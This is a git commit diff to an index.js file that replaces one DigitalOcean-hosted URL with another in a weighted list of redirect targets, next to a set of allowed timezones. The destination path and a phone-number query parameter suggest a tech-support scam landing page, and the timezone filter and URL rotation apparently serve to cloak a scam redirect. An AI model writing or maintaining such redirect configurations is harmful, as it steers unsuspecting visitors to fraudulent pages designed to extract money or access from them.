e0451f68404667f0d2d4c563a3424297d94b0098
paalakash <palaksh452@gmail.com>
2026-06-18 14:20:11 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://king-prawn-app-2-7l47m.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5211", weight: 1.0 }
+    { url: "https://seahorse-app-v8y8k.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5211", weight: 1.0 }
 
 ];
 
